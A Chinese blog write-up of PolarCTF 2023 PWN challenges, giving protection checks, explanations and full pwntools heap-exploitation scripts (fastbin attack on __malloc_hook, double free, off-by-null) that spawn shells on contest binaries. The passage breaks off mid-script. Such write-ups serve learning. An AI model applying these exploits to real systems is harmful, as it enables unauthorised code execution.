<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>PolarCTF_2023_wp | Ky不是枕木</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Ky不是枕木" type="application/atom+xml">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>PolarCTF_2023_wp</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-09-27T15:14:29.000Z" id="date"> 2023-09-27</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-09-30T09:10:52.078Z" id="updated"> 2023-09-30</time></div></span><br><span>Word Count: <div class="control">3.6k</div></span><br><span>Read Time: <div class="control">19 min</div></span></div></div><hr><div id="post-content"><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><blockquote>
<p>记录一下 一次比赛的复盘，除了夕阳下的舞者有点难度之外，其他题目难度还适中，最后也是拿到了不错的排名！期待12月份的Polar D&amp;N的冬季赛！</p>
</blockquote>
<p class='item-img' data-src='https://s2.loli.net/2023/09/30/ENZdsnHgIiDKFzQ.png'><img src="https://s2.loli.net/2023/09/30/ENZdsnHgIiDKFzQ.png" alt="image.png"></p>
<p>最后每道题目都有官方视频讲解，链接 <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1fr4y1Z73F?p=1&amp;vd_source=5c5a710dfdccbb5b7b821586612058bd">【PWN】小狗汪汪汪_哔哩哔哩_bilibili</a></p>
<h2 id="emo-chunk"><a href="#emo-chunk" class="headerlink" title="emo_chunk"></a>emo_chunk</h2><h3 id="程序保护"><a href="#程序保护" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br></code></pre></td></tr></tbody></table></figure>

<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ul>
<li>堆溢出，可以通过溢出chunk内容，从而修改下一个chunk的size字段，制造堆块重叠，将下一个chunk大小改为small chunk，这样free掉之后，会放入unsortedbin中，fd和bk都指向main_arena_88</li>
<li>然后可以通过打印函数泄露libc地址</li>
<li>利用fastbin的特性，向malloc_hook-0x23的位置申请chunk，覆写malloc_hook</li>
</ul>
<blockquote>
<p>注意一般思路是这样的，但是题目具体要使用realloc_hook来进行调栈，具体操作为改realloc_hook为onegadget，malloc_hook为realloc_hook，这样执行malloc时，会实现二级跳。malloc_hook -&gt; realloc_hook -&gt; onegadget</p>
</blockquote>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote('123.60.135.228',2094)</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>():<br>    <span class="hljs-keyword">global</span> p,elf,libc<br>    p = process(<span class="hljs-string">'./emo_chunk'</span>)<br>    <span class="hljs-comment">#p = remote('123.60.135.228',2064)</span><br>    elf = ELF(<span class="hljs-string">'./emo_chunk'</span>)<br>    libc = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">xuhao</span>):<br>    p.recvuntil(<span class="hljs-string">'Please Choice!\n'</span>)<br>    p.sendline(xuhao)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    cmd(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input Size:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    cmd(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">'Change EMo Content\n'</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"4"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    cmd(<span class="hljs-string">"5"</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params">i,j</span>):<br><br>    heaparray = <span class="hljs-number">0x6020E0</span><br>    backdoor = <span class="hljs-number">0x400946</span><br>    free_got = elf.got[<span class="hljs-string">'free'</span>]<br><br>    <span class="hljs-comment">#创建几个chunk</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#0</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#1</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#2</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#3</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#4</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#5 隔离top chunk</span><br><br>    <span class="hljs-comment">#泄露libc</span><br>    edit(<span class="hljs-number">0</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0x68</span> + <span class="hljs-string">'\xe1'</span> + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">7</span>)<br>    delete(<span class="hljs-number">1</span>)<br>    <span class="hljs-comment">#debug()</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#1</span><br>    show(<span class="hljs-number">2</span>)<br>    libc_base = u64(p.recvuntil(<span class="hljs-string">'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0x3c4b78</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"libc_base -&gt; "</span>,<span class="hljs-built_in">hex</span>(libc_base))<br><br>    <span class="hljs-comment">#计算地址</span><br>    malloc_hook = libc_base + libc.sym[<span class="hljs-string">'__malloc_hook'</span>]<br>    realloc = libc_base + libc.sym[<span class="hljs-string">'realloc'</span>]<br><br>    one = [<span class="hljs-number">0x45226</span>,<span class="hljs-number">0x4527a</span>,<span class="hljs-number">0xf03a4</span>,<span class="hljs-number">0xf1247</span>]<br>    one_gadget = libc_base + one[i]<br><br>    delete(<span class="hljs-number">4</span>)<br><br>    edit(<span class="hljs-number">3</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0x68</span> + p64(<span class="hljs-number">0x71</span>) + p64(malloc_hook - <span class="hljs-number">0x23</span>))<br>    <span class="hljs-comment">#debug()</span><br><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#4</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#malloc 6</span><br><br>    <span class="hljs-comment">#思路1,将malloc_hook改成one_gadget，但是打不通</span><br>    <span class="hljs-comment">#payload = 'a'*(0x23-0x10) + p64(one_gadget)</span><br>    <span class="hljs-comment">#思路2,将realloc_hook改成one_gadget,调栈</span><br>    <span class="hljs-comment">#payload = 'a'*(0x23-0x10-0x8) + p64(one_gadget) + p64(realloc + j) #将malloc_hook修改成realloc_hook</span><br>    <span class="hljs-comment">#思路3,题目有后门,直接改malloc_hook为后门函数</span><br>    payload = <span class="hljs-string">'a'</span>*(<span class="hljs-number">0x23</span>-<span class="hljs-number">0x10</span>) + p64(backdoor)<br>    edit(<span class="hljs-number">6</span>,payload)<br><br>    add(<span class="hljs-number">0x68</span>)<br><br>    p.interactive()<br><br><br><span class="hljs-comment"># for i in range(4):</span><br><span class="hljs-comment">#     for j in [2,4,6,8,10]:</span><br><span class="hljs-comment">#         try:</span><br><span class="hljs-comment">#             print("i :",i)</span><br><span class="hljs-comment">#             print("j :",j)</span><br><span class="hljs-comment">#             p = process('./emo_chunk')</span><br><span class="hljs-comment">#             pwn(i,int(j))</span><br><span class="hljs-comment">#         except:</span><br><span class="hljs-comment">#             p.close()</span><br><span class="hljs-comment">#注释为暴力调栈,得出i = 1, j = 8</span><br><br>connect()<br>pwn(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>)<br><br><span class="hljs-string">'''</span><br><span class="hljs-string">0x45226	execve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a	execve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4	execve("/bin/sh", rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247	execve("/bin/sh", rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">'''</span><br></code></pre></td></tr></tbody></table></figure>



<h2 id="double-free"><a href="#double-free" class="headerlink" title="double  free"></a>double  free</h2><h3 id="程序保护-1"><a href="#程序保护-1" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br></code></pre></td></tr></tbody></table></figure>

<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>double free 可以申请任何我们想要的地址的一个chunk，进而修改内容，本题目就是修改bss段上的值为固定值，进而getshell，具体做法就是申请2个chunk，制造double ，free，形成chunk 1 -&gt; chunk 2 &lt;- chunk 1，修改chunk 1 的指向为目标地址，然后通过连续的malloc 4次，既可申请到目标地址，最后修改chunk内容即可</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">'linux'</span>, arch=<span class="hljs-string">'amd64'</span>, log_level=<span class="hljs-string">'debug'</span>)<br>p = process(<span class="hljs-string">'./heap_Double_Free'</span>)<br><span class="hljs-comment">#p = remote('123.60.135.228',2133)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">xuhao</span>):<br>    p.recvuntil(<span class="hljs-string">'root@ubuntu:~/Desktop$ '</span>)<br>    p.sendline(xuhao)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,size,content</span>):<br>    cmd(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">'please input id and size :\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    cmd(<span class="hljs-string">"2"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    cmd(<span class="hljs-string">"3"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getshell</span>():<br>    cmd(<span class="hljs-string">"4"</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br><br>goal = <span class="hljs-number">0x6010b0</span> <span class="hljs-comment">#将这里的值改为 257</span><br>fd = <span class="hljs-number">0x6010b0</span><br>create(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#0</span><br>create(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'bbbb'</span>) <span class="hljs-comment">#1</span><br><span class="hljs-comment">#create(2,16,'cccc') #2 防止和topchunk合并</span><br><span class="hljs-comment">#debug()</span><br><span class="hljs-comment">#double free</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>,p64(goal-<span class="hljs-number">0x10</span>)) <span class="hljs-comment">#3</span><br>create(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#4</span><br>create(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#5</span><br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">6</span>,<span class="hljs-number">0x68</span>,p64(<span class="hljs-number">0x101</span>)) <span class="hljs-comment">#6</span><br>debug()<br>getshell()<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>

<h2 id="easychunk"><a href="#easychunk" class="headerlink" title="easychunk"></a>easychunk</h2><h3 id="程序保护-2"><a href="#程序保护-2" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br></code></pre></td></tr></tbody></table></figure>

<h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>offbynull </p>
<ul>
<li>申请4个chunk，free掉chunk 0。然后编辑chunk1，覆写chunk2的prev_size为chunk0 + chun1，size低位为0，表示前面的chunk为free chunk</li>
<li>chunk 0 chunk 1 会合并，但是 chunk 1 始终存在，合并后放入了unsorted bin 中，申请一个同样大小的chunk 5收回chunk0，这样chunk 1的fd 和bk都是main_arena_88，泄露libc地址</li>
<li>最后通过fastbin向malloc_hook-0x23申请地址，最后修改malloc_hook 为 og</li>
</ul>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote('123.60.135.228',2094)</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>():<br>    <span class="hljs-keyword">global</span> p,elf,libc<br>    local = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> local:<br>        p = process(<span class="hljs-string">'./easychunk'</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2114</span>)<br>    elf = ELF(<span class="hljs-string">'./easychunk'</span>)<br>    libc = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">xuhao</span>):<br>    p.recvuntil(<span class="hljs-string">'Please Choice!\n'</span>)<br>    p.sendline(xuhao)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    cmd(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please give me a name for item:\n'</span>)<br>    p.sendline(<span class="hljs-string">'aaaa'</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input Size:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">'Content of Emo!:\n'</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    cmd(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">'Change EMo Content\n'</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"4"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    cmd(<span class="hljs-string">"5"</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br><br>    dem = <span class="hljs-string">"hello,everyone.Welcome to:Polar D&amp;N:"</span><br>    p.recvuntil(<span class="hljs-string">'Where are you from?\n'</span>)<br>    p.sendline(dem)<br>    <span class="hljs-comment">#申请几个chunk</span><br>    add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">"aaaa"</span>) <span class="hljs-comment">#0</span><br>    add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">"bbbb"</span>) <span class="hljs-comment">#1</span><br>    add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">"cccc"</span>) <span class="hljs-comment">#2</span><br>    add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">"dddd"</span>) <span class="hljs-comment">#3</span><br><br>    <span class="hljs-comment">#free掉chunk0</span><br>    delete(<span class="hljs-number">0</span>) <span 